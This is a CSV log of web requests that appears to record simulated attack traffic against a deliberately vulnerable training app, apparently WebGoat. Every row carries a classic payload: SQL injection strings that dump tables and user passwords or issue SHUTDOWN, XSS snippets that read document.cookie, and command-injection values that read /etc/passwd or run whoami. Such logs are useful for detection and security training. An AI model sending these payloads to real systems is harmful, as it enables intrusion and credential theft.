_id,signature,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
f8cddec9-ec7e-49bc-bfc3-af5b813c4201,c1c0bbc614a6413d39df0f65888426e8,14753,121.78.159.214,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'rxZ2Z3RM'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:54.395662
6f96303d-61f0-47ef-a898-df2e586b8060,9ea842122f0bdb440e8e219583f82b02,14753,63.74.201.42,POST,cia/command-injection,HTTP/1.1,"[('_uid', '7tFrs1kK'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:54.400142
e393f013-912b-43a7-ae8a-b50211bb720a,77f5bada543cc6cc89e661104ee54514,279,121.110.123.13,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=zwSegPju,200,2025-10-12T01:08:54.449170
5468405b-1fc5-4730-9140-42b894e91017,7d6d724af6a622f769e8087295043d37,279,43.94.199.130,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=lYAk2SZg,200,2025-10-12T01:08:54.507451
62bf3bea-fbe2-4d66-8cea-d74e7d702571,5cde24982ef43ed909b415166707c21d,14753,52.14.163.101,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'B7wsDEQ2'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:54.572560
c6086b40-d0f8-42c4-8680-48d64ed42896,fee8dd5743221950f9f60204772c10f5,14753,221.80.55.176,POST,cia/command-injection,HTTP/1.1,"[('_uid', '7093QVal'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:54.579602
fb0b2ff6-b6e0-45d1-b905-3024ec7e639a,86dc7adb4286df629e7a8b062ecac5df,14753,116.118.220.69,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'E1nhjv2r'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:54.627631
7b7246fd-4241-4882-8a9b-1ee9774a6713,1922e1b96d30afbb10f2e4bf6e794815,273,41.234.182.44,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5227'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:08:54.635932
e2e4c394-baa1-4ccc-8a1c-59e56978748c,08426ceb2d3f181b4b5f5d5dcc535806,273,172.3.250.241,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2428'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:54.707542
5779bf6b-e4de-46b8-b9c8-cef91d8298c1,3f7ff9131825a2d64be11292e3d394f4,367,221.111.62.182,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7048'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:08:54.770409
00c0b962-2494-46d1-af6a-02d43b5e1617,0cd3eb41ad48c983f4eac252c1423c7f,367,24.108.29.151,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7121'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:08:54.828850
dcde4d51-6867-4e15-83c7-bc056e34d66e,700241f540dc046d1d9690f09da7def2,273,202.187.108.65,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4784'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:54.898863
acb78e32-8fe0-4be7-97fe-e3ac1ad9da07,78d2fdd00d60e6ea4cf287f5b6a18ebc,14753,128.36.64.46,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'skPut5gD'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:54.957544
1cad7725-3c12-4b34-ac4d-ff337616f102,9ce78df8a521724a46034c69a5238a06,14753,70.199.86.147,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'f8tu4LSl'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:54.965593
5451fac7-9492-45e8-97f5-126dcc10cc81,9c40fc17c80805a2b470c5ecefbf24aa,14753,13.121.67.40,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'xlCJOe03'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:54.973938
f0cb6e3e-730a-41fd-8a0f-cabfe43ce10b,227680f8a011bd4b3cbd152e0ef600bf,14745,30.127.231.105,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:55.017914
e32b1b9c-d405-4c69-b9f2-39643ee08398,3abdfebc747e6e36ffcd991ddb83f3a6,14753,164.227.28.5,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'KPWN9kZO'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:55.068426
19ebb012-421e-4569-9d89-bb17955c4aa1,c943b0524c1ff2e6fcfb34f5784dee13,273,217.0.232.29,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4138'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:55.077573
5235c262-3f42-42d6-9f18-1e3b599c9212,f7566be9d6d19366330569596df6f1de,279,200.50.10.127,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=B3sDeX4H,200,2025-10-12T01:08:55.145446
b8e7e355-fd8f-44d7-803d-328bde8ff105,c96310462bcde2b52de63e98c0f4ea24,14745,157.192.215.247,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:55.207875
506bde1c-382b-47ec-8917-0cb20c2fd1dc,9171a1c535c20d0f9d99be29530fbd18,14745,192.141.179.85,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:55.265503
caa5b92d-78cc-45c6-af2c-3eec54598080,a2b7b9b05558b455ae4f62b618f945e0,14745,205.49.224.137,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:55.318319
abcb2a84-cbcf-429c-af33-e90188ad7c32,0ae21c73ca3b190cd979808ba1605ba5,273,99.184.48.30,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6392'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:08:55.371215
82542911-ad7f-41c3-85f2-24622fedbc19,9591195a49b7d99c09a18714289ca94f,14745,1.98.120.157,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:55.440161
a635f62c-7b22-4e4e-a59b-a65375119b26,0918b6f83f84b09345cf91a1fef6a810,14745,112.215.211.12,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:55.494022
8df43b0a-f996-4826-adba-ebe3d29e9e2e,b0c6f379ff8c4e1b7eae43c3a2ccb86b,273,82.71.187.137,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8050'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:55.539728
8ec5f47b-83a1-489d-9075-24ee2ea6348d,b23b86a2321dfae5e5300f8f4df99956,307,92.186.103.38,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8439'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:55.620509
d4d462b9-f3a5-4f13-b1f3-f155b7585b35,401c031fb38214e6ab0ffcf575c2ee79,279,41.220.245.207,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=E6ixITlf,200,2025-10-12T01:08:55.849140
83955d5a-8b79-4e6d-b198-cca2cdaf25e9,80868591a5354668b422528cb8552ed7,367,46.136.92.78,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6921'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:08:55.859088
756f1fd4-6290-48bd-bff7-42c556b0f807,dda4e4bc8c83f5fdce45daa3bdf8e889,14753,223.131.70.165,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'cMXvheQP'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:55.919344
731b4cf4-1aeb-4f3a-bbc8-b108f5f15c4e,d8991c23773d52c8978056b9f7b76e34,14753,153.123.27.195,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'RH3dyVwo'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:55.923712
40bc3ac4-a785-4c72-932e-6d655421581f,d9feee6bd807b10a4b379e2c5bb96e83,273,35.92.173.99,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8012'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:55.972885
8cf58d65-7b2b-4180-8ce6-984451094270,4f03457816ea91591069c4618e2fe2cc,14745,192.1.142.64,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:56.029914
28226a34-b518-4344-8c1a-f2f57f8c6df5,8eab01271d90c4ffa9d9abc173c9f0ff,14745,109.44.164.175,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:56.082412
61f9fc5f-f17e-4602-93f1-5eb7e8769a1f,d797f4aabcc0e75bb8694feff05e270e,14745,155.25.48.139,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:56.133463
b6a4ccee-6fc6-42d9-99f7-a5fb4acf63f3,3a3ada5671a82a589052b2367f049e5a,367,81.219.220.143,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1481'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:08:56.185124
0eb53961-ba32-49c4-84c9-5f79d52352ec,8fca96f3734cd013b2bbf0c9c3a6d675,279,144.232.29.15,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=GggjZYQw,200,2025-10-12T01:08:56.260247
308c047b-dceb-46a5-96d7-8198e349c54b,6d2420dc028de701bc0889b63108895e,279,207.204.67.210,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=uGMMwjvq,200,2025-10-12T01:08:56.318652
d6c357da-9af2-4e1e-9f34-602377498fb4,c245a7d1a46722fbaf8fa3f7fd838d04,307,71.234.143.53,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2696'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:56.375966
642546ab-4889-4c18-9cc3-7a4467757b45,40f091e476b9f43cafb37914a672aca8,279,198.230.56.51,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=181YALG0,200,2025-10-12T01:08:56.592735
52ae762d-3e12-4967-8f5c-77f749bf71f5,6f7286b063b6d5932462db90f9b501f9,307,84.174.140.171,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8042'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:56.602856
a62838ae-45f4-48ef-bbab-1651c8802212,5e8f9555b6a753c216ac4f138f4cd06e,14753,87.189.68.64,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'zbgokWE4'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:56.833263
73be9494-a7ac-421b-82f7-c315ac129946,178408d0b5ba8f0b690f17a842c1f82b,279,46.40.247.177,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=NmqCFVYB,200,2025-10-12T01:08:56.841049
5ec87f84-ecd9-4531-937a-349372c637d7,39a9363b574b3aabd76b8b9e013bb99f,14745,145.126.40.7,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:56.895138
0895b310-56d9-4b85-9f33-91f9a4a8ef0d,2c7415358d404d26ca4512dd611de041,367,189.77.192.221,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4249'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:08:56.944209
0bf9669b-45e6-4a90-b608-dde9faadcc32,87d9b75dda9c55b08988323e02732f36,14745,147.183.199.136,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:57.012902
ad2df647-fe7b-4976-b630-32dfe689470f,7de977869b7df5dec5beba2171f4fb50,273,32.238.230.216,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9587'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:08:57.060267
29bd3f3e-d15e-41f4-8ea9-ba9bf1cc1bae,f99135cccda5dc780cd49c068705ddb6,273,29.212.148.206,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1820'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:57.123152
de25e6cf-7fea-46ec-8a5e-f2e46d22fcb9,a1fc0e1aabbc9cc5b6ca20377d07a442,14745,141.119.111.167,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:57.175861
a9aa20b5-e4bf-4dba-aca0-37c195c7782f,dad99b76b38cbd94be5794173dd9a492,307,147.20.115.182,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8325'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:57.210886
5ce825e7-c5ad-4c54-ad53-6199448dba01,62bf8911013d6b720ec5084111b8c3d6,279,151.158.137.86,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=wXaIkpim,200,2025-10-12T01:08:57.439642
8feeedfb-6946-46e0-a912-ad14bf08a84f,ed5b46418e8865e0a1ae21e95b9e4c20,14745,213.84.186.248,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:57.450375
455f13a6-6241-4a75-80ca-d25fa3f2f980,333894671679fc3e471dce3340f8737a,279,107.229.198.130,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=VnmTEXKw,200,2025-10-12T01:08:57.504293
e7dff842-7882-41dc-ad27-a613e4776b74,7a91f2236c46b66cf74e4b35106a2e5c,279,214.92.121.201,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=OdPdOmeN,200,2025-10-12T01:08:57.563448
7de0fa8f-1b36-4c19-b939-622a3b88adb0,e389545ed3f0e130fa4d68c48d05eaec,14753,16.243.17.21,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'PHAnNjXn'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:57.620408
d6961157-eaa0-49fb-b959-89477717129a,a77d8ad428b3896ce417fb652aa5d10f,279,40.75.33.108,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=XlwrlzPg,200,2025-10-12T01:08:57.625431
d5507617-26cc-4312-a023-f93d3ec34c1a,258be172409cbf914b9dfca96bfa9fbe,273,213.27.69.96,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6823'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:57.704404
44db36d0-8663-4255-b05b-b9222c0ec27e,266cd63646e5583bfbd5920141d6ca13,307,156.40.242.178,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8458'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:57.764251
f212e95c-8e14-456f-9704-06a4b4319252,b74844f27bdcf6a43bc4e39af690a922,279,85.244.179.73,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=twa2d0wE,200,2025-10-12T01:08:57.975107
8a8dcb77-664c-45a4-9149-3f688a701405,84b2687da2075fdb3d16b6fc24777623,273,168.111.68.218,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5419'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:57.987742
00ccc803-3195-4ccd-b5a4-6a9109b8596e,64443e9a34d2e377c0bd33e7282ccfa0,279,73.150.71.46,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=xTFyVBlo,200,2025-10-12T01:08:58.045178
cd522615-f321-4c39-9866-b44844cc0e68,bfee26570d184b243d7d3dbb630aaf5c,279,84.161.124.203,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=MuLH6wOv,200,2025-10-12T01:08:58.098359
31ae3e4d-6859-4b80-84a9-dbb1e53db12e,e2ea53f12a2ca75a539f301a3806aa2e,14745,93.231.158.162,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:58.153413
f6938b14-4463-491b-9a0a-4888bb297bd8,8c1f0a80cc51224e18280099329af787,14745,135.114.77.208,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:58.203605
87725d8b-ab7c-40ec-b218-25cdf5819b00,5a3f5fc4072bfc65ac5b0f495a28f029,273,186.43.249.153,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9494'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:08:58.254621
0d87b7c6-0cd6-43a7-90f5-15599ed9b89c,323cffb091f070caa483519cd88aca6c,14745,50.79.221.110,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:58.319640
855001f0-3085-4a41-b946-613597ed9b44,e7e909b2288905a7411aecb8aec77da0,14745,69.141.14.209,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:58.371359
ee2a91c2-b219-4901-8f8c-bfe87cb1a1ec,890f329de7f6dedc0e88f0bdef04f99c,273,13.152.114.148,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4780'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:08:58.423416
94d3fd79-c054-4be3-b1a9-91252c866640,af30cfca4c14be29f64adb6f9c203cbc,14745,210.8.100.214,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:58.480117
cc322f49-085d-497d-8612-5b63f4c4ab79,ef3caf23385c758a2fd6ac3a05fbb5a4,14745,199.101.144.238,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:58.532890
dc6eb042-b688-41c2-aad4-b0b24ec32e29,9a94384a8fa4d60fd628f77b04f33ae0,14745,78.254.36.121,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:58.580266
d695f7eb-8137-43ac-aa85-c02a1832c195,962cc94773faad8327c70f57a9f70067,14753,54.89.124.66,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'p6FIzTiP'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:58.630335
c4b890ef-9c98-4da3-86e6-65481f85d374,412e6f81e1d9026041f09739e2dccb20,14753,58.245.2.121,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'tBFhn7Cm'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:58.638407
bf14b83c-ad7f-43fd-9ad0-45e73e0be0e4,93afdd54e44a0bd8151d1f97268aeb55,14753,189.89.79.7,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'jL2MrTJB'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:58.647660
99d41708-7ada-45b4-9d94-6ffecf34a7d7,cc9c65ff7c776528a846e5b5dee9a6d6,307,14.54.26.204,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3253'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:08:58.656657
256c08f5-19ee-4f93-9c18-58c375903b26,22929624d3ca43c3a34719b5aa1daad6,279,69.30.62.169,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=uYRPqXv1,200,2025-10-12T01:08:58.906096
12b04def-42f2-43c1-b106-8d7c1ba14600,091d60a286e2c0c6c77e616be3f1dfed,14753,126.111.247.166,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'raDxLA8O'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:58.919146
ed9db145-98ff-455c-8a5d-86dc2b9bff4d,80223d4a0f27f108c49840ada2acdd48,14753,210.227.132.128,POST,cia/command-injection,HTTP/1.1,"[('_uid', '7f9OMB7Q'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:58.928816
bced8675-31f9-4a25-9406-36f0fecc6366,86f8a59142dcc45b6689399950068968,14753,132.76.191.93,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'l0Mot1ea'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:08:58.973380
6cca96b3-f5e8-4ac5-bd39-7459e84585d7,55f0564a886da464332e37853307873d,279,196.14.54.248,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=GZISFPs1,200,2025-10-12T01:08:58.982043
6570c7f7-06a1-466c-8193-39e4bfc5e211,ad2bd04721ea1e8c50f293059e4391ac,367,37.166.10.237,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8006'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:08:59.037452
03ed7464-084e-45e0-94a5-602517b30d91,970aed0f1402bbe731625aff9255f9a7,367,22.186.186.114,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8321'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:08:59.099759
abb756bd-3daa-4ad2-81f1-de10da5e13ce,4ff0d55cc8acd2d677698374358bfb0d,367,222.200.118.38,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2815'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:08:59.157749
66067ac0-e674-4fed-9345-ae01a91c97a7,49c5690a401f538829aba35df051e8fc,14745,221.26.17.5,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:59.217968
80a22de9-50be-48b7-8289-1bdb8ca1d477,6353c00f78b868ee2e9203397dcfe11c,14753,121.11.28.212,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'TK9bMNmB'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:08:59.270700
2b21d8d8-bfcb-4ed6-b624-6e8072c171c0,3f7797bf8183383e0c98597985809ea2,279,53.230.117.15,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=jDt44Z1i,200,2025-10-12T01:08:59.276817
003e55b8-666d-4dd1-b19c-5c837f922e22,62f8dc7fc1f4eab6522d27083da70862,279,1.200.55.157,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=4c6ULael,200,2025-10-12T01:08:59.335505
e4ceeb0a-b063-49d4-bbff-ed362b997979,a42dc6c9aecc2b20add456d1845263c3,14753,109.209.144.191,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'O3RHN0q7'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:59.391734
5f71d512-b3e9-4cd9-83e5-ac2a70209930,e5ef46499eed375448600345e9e78403,14745,53.143.188.191,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:59.398159
2037d0c5-e8f2-466c-81c9-46fa51dbd694,1bd9718ec9dcab85470bd8202f5b47d2,14753,3.252.165.94,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'XSqTV9wk'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:59.447270
a443ee15-4dae-4b73-bf0c-ddd12798cbd4,7de083995662f5683f367116f0e88a9e,279,205.46.189.254,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=tBVxmgmq,200,2025-10-12T01:08:59.456342
2ecceba0-7265-456d-a7c5-63073c82b211,fe9d42cfda1cf053e1beccb82b3b2c56,367,164.132.82.81,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7579'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:08:59.522602
82f156df-f393-4b53-a7e4-faddea037266,a227cb4e770b9facdd95ce8ac3e63fcd,14745,90.251.78.189,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:59.582531
5a3b0f08-7f03-4a1d-b87e-f9f0eb90ac16,74eecdfd053ba87454b3ccd33570c2c3,14753,101.25.23.8,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'oeTI7La6'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:59.635013
13b37009-2887-4708-aee3-a1a5ded1b8c1,cb1e98266f1cc2233180b66257a8c860,14745,220.164.148.145,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:08:59.639332
6a7d5af6-13aa-4ca3-8c6f-83145b72e765,93bcf4aa266f89bd20f82233f9e1f9f9,367,198.60.153.63,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5853'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:08:59.686548
e8fcc5ff-26c4-481d-a2e5-2842e3e1af4c,39b4046d8c98879e51dfa7e8df4db40f,14753,144.243.73.221,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'MMOwlGY5'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:08:59.763605
e2b141b3-5f86-45c2-a8d5-e5cb7427ed33,ac969eb519c4d2e9ea82b86e235eedca,273,150.228.65.12,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3578'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:08:59.768989
b30270cf-e98e-41c0-aef3-ba22be4611c1,ffeaa3572614338ddf8a74d4a0768cb3,367,85.185.30.245,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5998'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:08:59.822008
c388dfaa-60a5-4da4-bf8c-cc1a5b1c414f,1c5fbf81b12ff75e921de37c0398d0d0,273,133.87.199.224,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6550'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:08:59.876149
df4e5ff6-b6d3-4a33-ac9e-677dd2b4c447,c3cccce0bb2a303bfa629c54e40ce5f4,14753,177.85.149.57,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'LA17kY5b'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:59.938428
d500bd86-518f-4114-a856-2aa1779ad44c,16b7ee7b81c8dfadceff75ec670c7f89,14753,81.143.29.229,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'IO34F3Vo'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:08:59.944225
a1b91ddf-7420-4679-82ed-d6301225354a,b68933b6493c6b8853e6376f8e8f2c29,279,68.76.225.235,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=mNeU8tTn,200,2025-10-12T01:08:59.991919
499c43b1-a063-4f0e-a610-b2534adcfeff,950f29b518403a43c2ae9611b15ea640,279,8.192.154.217,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=WpQKE4nE,200,2025-10-12T01:09:00.052249
54201456-6f9a-4b61-891a-51cc9580144a,9203a0966dd25bb5628a90ab1b5f592a,279,157.163.191.165,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=yXkHaV1n,200,2025-10-12T01:09:00.106202
